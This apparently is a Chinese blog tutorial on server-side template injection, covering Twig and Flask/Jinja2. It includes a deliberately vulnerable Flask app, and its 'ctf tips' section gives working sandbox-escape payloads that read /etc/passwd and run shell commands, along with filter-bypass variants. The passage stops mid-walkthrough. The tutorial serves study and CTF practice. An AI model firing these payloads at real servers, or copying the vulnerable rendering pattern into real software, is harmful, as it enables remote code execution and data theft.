@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>SSTI模板注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言开局一张图，姿势全靠yy  模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。 和常见We">
+<meta name="keywords" content="渗透攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入">
+<meta property="og:url" content="http://yoursite.com/2018/11/11/SSTI模板注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言开局一张图，姿势全靠yy  模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。 和常见We">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZZV.syC4eaxGtI3eCw7o2iin*1NXlIgclNjp2Qq2pgc!/b/dFMBAAAAAAAA&bo=0ANGAgAAAAARB6c!&rf=viewer_4">
+<meta property="og:image" content="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/zuZGaJU3ir7FWgwJ5LL1uuMe8Nr3bCRqSYxBrP8rS*A!/b/dDQBAAAAAAAA&ek=1&kp=1&pt=0&bo=ygG2AAAAAAARF10!&tl=3&vuin=275640346&tm=1542081600&sce=60-2-2&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/.EL6oFhItl9HOx2INzFAMkjTMI2qQ5sAdHpuzf8JpQ0!/b/dFQBAAAAAAAA&bo=9QJAAQAAAAARF5Y!&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/eHiQvxRwHidBs8twbzEB3VUMscrXRF0NH7eK2ukrDSE!/b/dDABAAAAAAAA&bo=EwLIAAAAAAARF*k!&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/aZkd5oTVYo0RbjD0*vftwABvX6JE5KiLf*IrjrjsGc8!/b/dDIBAAAAAAAA&bo=iwF7AAAAAAARF9E!&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/rV6n9sC3CNsxf9et5mL08q*ADfAQ*mciWbswTxH.bRM!/b/dFIBAAAAAAAA&bo=5gXkAQAAAAADFzQ!&rf=viewer_4">
+<meta property="og:image" content="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/klIjDTuXdvK2WHYLBnbwdGGPm2A*rf.7MMxdNmbpv.U!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=5AQ.AgAAAAADF.4!&tl=1&vuin=275640346&tm=1542027600&sce=60-2-2&rf=viewer_4">
+<meta property="og:image" content="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/Y0Oac1o2cQOAu0NM7nmuBXjeipvhOME0Wb.beSH251A!/b/dDcBAAAAAAAA&ek=1&kp=1&pt=0&bo=AATQAAAAAAADF.Y!&tl=1&vuin=275640346&tm=1542027600&sce=60-3-3&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/NUgdkGbd66DvHoR1MVaeOnymKCggCA74kQAZK9IPUlM!/b/dDYBAAAAAAAA&bo=AAQ.AQAAAAADJzk!&rf=viewer_4">
+<meta property="og:image" content="https://i.imgur.com/L0UPxs9.png">
+<meta property="og:image" content="https://i.imgur.com/gYtrssG.png">
+<meta property="og:image" content="https://i.imgur.com/IjXOomg.png">
+<meta property="og:image" content="https://i.imgur.com/3U7o2lZ.png">
+<meta property="og:image" content="https://i.imgur.com/B8NudVg.png">
+<meta property="og:image" content="https://i.imgur.com/WqQAEPJ.png">
+<meta property="og:image" content="https://i.imgur.com/JGrANw3.png">
+<meta property="og:image" content="https://i.imgur.com/ynBodJp.png">
+<meta property="og:image" content="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/lUdLHBc1bAjEHGvpbiUFtDo*mw2Agz*MFkWVuT030mc!/b/dFMBAAAAAAAA&ek=1&kp=1&pt=0&bo=3AJDAwAAAAADF6w!&tl=1&vuin=275640346&tm=1542258000&sce=60-2-2&rf=viewer_4">
+<meta property="og:updated_time" content="2018-12-17T13:02:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSTI模板注入">
+<meta name="twitter:description" content="前言开局一张图，姿势全靠yy  模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。 和常见We">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZZV.syC4eaxGtI3eCw7o2iin*1NXlIgclNjp2Qq2pgc!/b/dFMBAAAAAAAA&bo=0ANGAgAAAAARB6c!&rf=viewer_4">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SSTI模板注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/11/SSTI模板注入/" class="article-date">
+  <time datetime="2018-11-10T16:00:00.000Z" itemprop="datePublished">2018-11-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SSTI模板注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开局一张图，姿势全靠yy</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZZV.syC4eaxGtI3eCw7o2iin*1NXlIgclNjp2Qq2pgc!/b/dFMBAAAAAAAA&bo=0ANGAgAAAAARB6c!&rf=viewer_4" alt></p>
+<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。</p>
+<p>和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<h1 id="小课堂—模板渲染是what？"><a href="#小课堂—模板渲染是what？" class="headerlink" title="小课堂—模板渲染是what？"></a>小课堂—模板渲染是what？</h1><p>首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。  </p>
+<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。  </p>
+<p><font size="5">后端渲染</font></p>
+<p>后端渲染HTML的情况下，浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，这里的计算就是服务器经过解析存放在服务器端的模板文件来完成的，在这种情况下，浏览器只进行了HTML的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户。</p>
+<p>实现：后端拼字符串呗…… （理论上后端模板也是字符串）  </p>
+<p>好处：模板统一在后端。前端（相对）省事，不占用客户端运算资源（解析模板），只要不大改结构，文字啥的小修改后端改了就好了。</p>
+<p>坏处：占用（部分、少部分）服务器运算资源、，response 出的数据量会（稍）大点，模板改了前端的交互和样式什么的一样得跟着联动修改。</p>
+<p><font size="5">前端渲染</font></p>
+<p>前端渲染就是指浏览器会从后端得到一些信息，这些信息或许是适用于题主所说的angularjs的模板文件，亦或是JSON等各种数据交换格式所包装的数据，甚至是直接的合法的HTML字符串。这些形式都不重要，重要的是，将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示。</p>
+<p>好处：不占用服务端运算资源（解析模板），模板在前端（很有可能仅部分在前端），改结构变交互都前端自己来了，改完自己调就行。不用麻烦后端再联调神马的。  </p>
+<p>坏处：占用（一部分、少部分）客户端运算资源（解析模板）。前端代码多点，毕竟包含模板代码了么。脚本是不是首次下就慢点了（看你在意不在意这个毕竟能304和CDN啥的）。可能造成前后两份模板的情况，总归要后端吐出个首屏啥的先让用户看见吧。那这部分页面模板不就是后端拼好了吐出来的么。</p>
+<p>示例1：定义一个模板，例如</p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;{$what}&lt;/div&gt;
+&lt;/html&gt;</code></pre><p>这只是一个模板。{$what}是数据。此时不知道数据是什么。</p>
+<pre><code>如果我想html里面成为
+&lt;div&gt;peiqi&lt;/div&gt;
+渲染到html代码里</code></pre><p>渲染完成后</p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;peiqi&lt;/div&gt;
+&lt;/html&gt;</code></pre><p>当然这只是最简答的例子；<br>一般来说，至少会提供分支，迭代。还有一些内置函数，如格式化等等<br>那么 {$what}这个数据如何代码传入。<br>比如我工作用的模板引擎是smarty<br>我定义了一个模板。  </p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;{$what}&lt;/div&gt;
+&lt;/html&gt;    </code></pre><p>js代码就是这么写就可以了</p>
+<pre><code>var tpl= new jSmart(tplStr);//tplStr就是模板的字符串。
+var content = &quot;Hello World&quot;;
+tpl.fetch({what:content});</code></pre><p>这样就可以了<br>其余的就交给引擎去渲染执行了。</p>
+<p>示例2：<br>模板：front.tpl</p>
+<pre><code>&lt;div&gt;
+{%$a%}
+&lt;/div&gt;</code></pre><p>后端：</p>
+<p>设置变量：$smarty-&gt;assign(‘a’, ‘give data’);<br>展示模板：$smarty-&gt;display(“front.tpl”);<br>到前端时是渲染好的html串：</p>
+<pre><code>&lt;div&gt;
+give data
+&lt;/div&gt;</code></pre><p>这种方式的特点是展示数据快，直接后端拼装好数据与模板，展现到用户面前。</p>
+<h1 id="为什么需要服务器模板"><a href="#为什么需要服务器模板" class="headerlink" title="为什么需要服务器模板"></a>为什么需要服务器模板</h1><p>首先解释一下为什么HTML代码和应用程序逻辑混合在一起不好，看下面的例子你就知道了。假如你使用下面的代码为你的用户提供服务：</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/zuZGaJU3ir7FWgwJ5LL1uuMe8Nr3bCRqSYxBrP8rS*A!/b/dDQBAAAAAAAA&ek=1&kp=1&pt=0&bo=ygG2AAAAAAARF10!&tl=3&vuin=275640346&tm=1542081600&sce=60-2-2&rf=viewer_4" alt></p>
+<p>这不仅仅是静态HTML代码。用户名是从cookie里获取并且自动填写的。这样一来，只要你之前登录过该网站，你就无需再次输入。但是这有一个问题，那就是你必须通过某种形式将值插入到HTML文档中，有两种方法可以实现，一种是正确的，一种是有危害的。不过我们要先问一下，为什么要这么做。<br>下图展示了解决该问题的完全错误的方法：<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/.EL6oFhItl9HOx2INzFAMkjTMI2qQ5sAdHpuzf8JpQ0!/b/dFQBAAAAAAAA&bo=9QJAAQAAAAARF5Y!&rf=viewer_4" alt></p>
+<p>这段代码有很多问题，作者不仅仅没有对用户的输入进行处理，HTML代码和PHP代码复杂的混合在一起，非常难以理解。部分HTML代码分布在多个函数中，这还不算什么，当你尝试修改HTML代码中任何内容时，你才发现有多难受，比如新增css类或修改HTML标签的顺序。</p>
+<p>上面这个例子显然是有意写的这么烂的，不过可以通过格式化进行优化。然而，在大型的代码库中，即使代码格式良好，也会很快变得无法管理。这就是为什么我们需要模板。</p>
+<p>与上面混乱的代码相比，服务器端模板提供了一种更加简单的方法来管理动态生成的HTML代码。最大的优点就是你可以在服务器端动态生成HTML页面，看起来跟静态HTML页面一样。现在我们来看看，当我们使用服务器端模板时，复杂的代码看起来如何。</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/eHiQvxRwHidBs8twbzEB3VUMscrXRF0NH7eK2ukrDSE!/b/dDABAAAAAAAA&bo=EwLIAAAAAAARF*k!&rf=viewer_4" alt></p>
+<p>这对前面的代码做了一些优化，它依然是静态的。为了显示正确的信息而不是大括号占位符，我们需要一个替换它们的模板引擎。后端代码可能是这样的。<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/aZkd5oTVYo0RbjD0*vftwABvX6JE5KiLf*IrjrjsGc8!/b/dDIBAAAAAAAA&bo=iwF7AAAAAAARF9E!&rf=viewer_4" alt></p>
+<p>这段代码的意思非常清楚，首先加载login.tpl模板文件，然后对与模板中名称相同的变量赋值（大括号里的变量），然后调用show()函数，相应的替换它们的内容并输出HTML代码。然而，我们在模板中增加了新的功能，这将会向用户展示模板渲染的时间。</p>
+<h1 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a>什么是服务端模板注入</h1><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p>
+<p>$output = $twig-&gt;render( $_GET[‘custom_email’] , array(“first_name” =&gt; $user.first_name) );<br>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p>
+<pre><code>custom_email={{7*7}} // GET 参数
+
+49  // $output 结果
+还有更神奇的结果：
+
+custom_email={{self}} // GET 参数
+
+Object of class
+__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误</code></pre><p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
+<p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p>
+<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值
+echo $output;
+?&gt;</code></pre><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。</p>
+<p>显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，</p>
+<p>但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击：<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/rV6n9sC3CNsxf9et5mL08q*ADfAQ*mciWbswTxH.bRM!/b/dFIBAAAAAAAA&bo=5gXkAQAAAAADFzQ!&rf=viewer_4" alt></p>
+<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;    
+?&gt;</code></pre><p><img src="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/klIjDTuXdvK2WHYLBnbwdGGPm2A*rf.7MMxdNmbpv.U!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=5AQ.AgAAAAADF.4!&tl=1&vuin=275640346&tm=1542027600&sce=60-2-2&rf=viewer_4" alt><br>上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。</p>
+<p>在 Twig 模板引擎里,   除了可以输出传递的变量以外,还能执行一些基本的表达式然后将其结果作为该模板变量的值,例如这里用户输入 name=20 ,则在服务端拼接的模版内容为:</p>
+<p><img src="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/Y0Oac1o2cQOAu0NM7nmuBXjeipvhOME0Wb.beSH251A!/b/dDcBAAAAAAAA&ek=1&kp=1&pt=0&bo=AATQAAAAAAADF.Y!&tl=1&vuin=275640346&tm=1542027600&sce=60-3-3&rf=viewer_4" alt></p>
+<p>这里简单分析一下,由于   作为 Twig 模板引擎的默认注释形式,所以在前端输出的时候并不会显示,而 16  作为模板变量最终会返回 16  作为其值进行显示,因此前端最终会返回内容 Hello IsVuln16OK ,如下图:</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/NUgdkGbd66DvHoR1MVaeOnymKCggCA74kQAZK9IPUlM!/b/dDYBAAAAAAAA&bo=AAQ.AQAAAAADJzk!&rf=viewer_4" alt></p>
+<h1 id="漏洞发掘"><a href="#漏洞发掘" class="headerlink" title="漏洞发掘"></a>漏洞发掘</h1><p>每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,就如同 SQL 注入中有着不同的数据库类型一样。</p>
+<p>简单来说,就是更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,有解析则可以判定含有 Payload 对应模板引擎注入,否则不存在 SSTI。</p>
+<p>模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p>
+<pre><code>smarty=Hello ${7*7}
+Hello 49
+
+freemarker=Hello ${7*7}
+Hello 49</code></pre><p>来确认漏洞。</p>
+<p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p>
+<pre><code>personal_greeting=username
+Hello user01</code></pre><p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p>
+<pre><code>personal_greeting=username&lt;tag&gt;
+Hello
+personal_greeting=username}}&lt;tag&gt;
+Hello user01 &lt;tag&gt;</code></pre><p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;    
+?&gt;</code></pre><p>上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。</p>
+<h1 id="模板引擎注入"><a href="#模板引擎注入" class="headerlink" title="模板引擎注入"></a>模板引擎注入</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p>
+<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。  </p>
+<p>重点来了，不同引擎有不同的测试以及注入方式！</p>
+<h1 id="flask-jinja2模板注入"><a href="#flask-jinja2模板注入" class="headerlink" title="flask/jinja2模板注入"></a>flask/jinja2模板注入</h1><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 </p>
+<p>Flask框架中提供的模版引擎可能会被一些无量开发者利用引入一个服务端模版注入漏洞，如果对此感到有些困惑可以看看James Kettle在黑帽大会中分享的议题(PDF)，简而言之这个漏洞允许将语言/语法注入到模板中。在服务器的context中执行这个输入重现，根据应用的context可能导致任意远程代码执行(远端控制设备)<br>可以参考本博客文章 Flask从零到无 。<br>这里给出一个漏洞环境代码，本地测试</p>
+<pre><code>from flask import Flask
+from flask import render_template
+from flask import request
+from flask import render_template_string
+
+app = Flask(__name__)
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+    template = &apos;&apos;&apos;
+        &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+
+    return render_template_string(template)
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><p>代码简析： 我们自己简单写一个string类型的 html，html返回当前url，我们放入到渲染函数render_template_string进行渲染，然后页面会打印出当前url，如果url里含有｛｝那么便可以进行模板注入。</p>
+<p>测试url </p>
+<pre><code>http://127.0.0.1:5000/test?{{config}}  </code></pre><p>测试结果如下：<br><img src="https://i.imgur.com/L0UPxs9.png" alt></p>
+<p>而如果我们使用render_template函数，</p>
+<pre><code>@app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转
+def index():
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))</code></pre><p>index.html</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+      &lt;h1&gt;Hello, {{user}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>那么将不会有模板注入，因为render_template已经传入一个固定好了的模板，没法再去修改，在渲染之后传入数据，只有当第一种代码，我们模板可控的时候，先传入后渲染，这样才会导致ssti模板注入。</p>
+<h2 id="ctf-tips"><a href="#ctf-tips" class="headerlink" title="ctf tips"></a>ctf tips</h2><p>1.那么实战ctf中如何利用呢，无非是读取文件或者getshell，</p>
+<p>Python中有一个 .<strong>class</strong> 可以获取实例对应的类，比如一个空字符串 “”.<strong>class</strong>就可以获取到 &lt;type’str’&gt; ，那这个字符串同样也可以换成列表，元组，字典。 “”同样可以换成元组，列表等。</p>
+<pre><code>print ().__class__.__bases__[0]
+&lt;type &apos;object&apos;&gt;</code></pre><p>可以看到元组的父类为object类，object是所有类的超类，而他之下又有很多方法可以调用，包括file 读取，system os等方法，我们再查看他之下的方法，然后找到对应的位置去调用。重点是将boject类找到，然后subclasses找他的方法，再从方法中找到合适的来读取或执行命令。如下poc，</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()</code></pre><p><img src="https://i.imgur.com/gYtrssG.png" alt></p>
+<p>因为().<strong>class</strong>.bases__为object类，所以我们直接subclasses查找方法，如果不是object类，则进一步base，().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()如下poc，</p>
+<pre><code>poc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}</code></pre><p><img src="https://i.imgur.com/IjXOomg.png" alt></p>
+<p>已经找到了object类然后进行下一步方法利用就可以了。<br>从这些方法中选去可利用的进行下一步渗透。如第四十个为&lt;type ‘file’&gt;方法，我们调用方法读取poc：</p>
+<pre><code>http://127.0.0.1:5000/test?{{().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()}}</code></pre><p>2.执行命令poc </p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
+
+object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)
+
+www.a.com/login.php{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre><p><strong>init</strong>用于将对象实例化</p>
+<p>其他的利用方式无非都是这个格式，方法自己去寻找，</p>
+<p>3.绕过（参考<a href="https://p0sec.net/index.php/archives/120/）" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/）</a><br>ctf中不免有一些函数会被过滤，我们可以通过拼接字符串的方式来绕过<br>如 poc </p>
+<pre><code>object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</code></pre><p>括号里的字符都可以通过’a’+’a’的方式来组合，组合后为aa，以此来绕过</p>
+<p>getattribute绕过</p>
+<p>我们想要的代码</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]</code></pre><p>进行关键字绕过</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;]</code></pre><p>两个不常见的执行任意命令的方法：</p>
+<p>import timeit<br>timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1)</p>
+<p>import platform<br>print platform.popen(‘dir’).read()</p>
+<p>走投无路时的poc <a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/</a></p>
+<p>参考文章：<a href="https://blog.csdn.net/iamsongyu/article/details/83109772" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83109772</a><br>参考文章：<a href="https://www.freebuf.com/articles/web/88768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/88768.html</a><br>参考文章：<a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>
+<h2 id="flask本地实战讲解"><a href="#flask本地实战讲解" class="headerlink" title="flask本地实战讲解"></a>flask本地实战讲解</h2><p>环境 python3.6<br>模版  flask<br>引擎 jinja2<br>源码  </p>
+<pre><code>from flask import Flask
+from flask import render_template_string
+from flask import request
+app = Flask(__name__)
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+        template = &apos;&apos;&apos;
+            &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+    return render_template_string(template)
+
+
+if __name__ == &apos;__main__&apos;:
+    app.run()</code></pre><p>1.先找object类，这里我们没采用常规的””.<strong>class</strong>而是用session[<strong>class</strong>]</p>
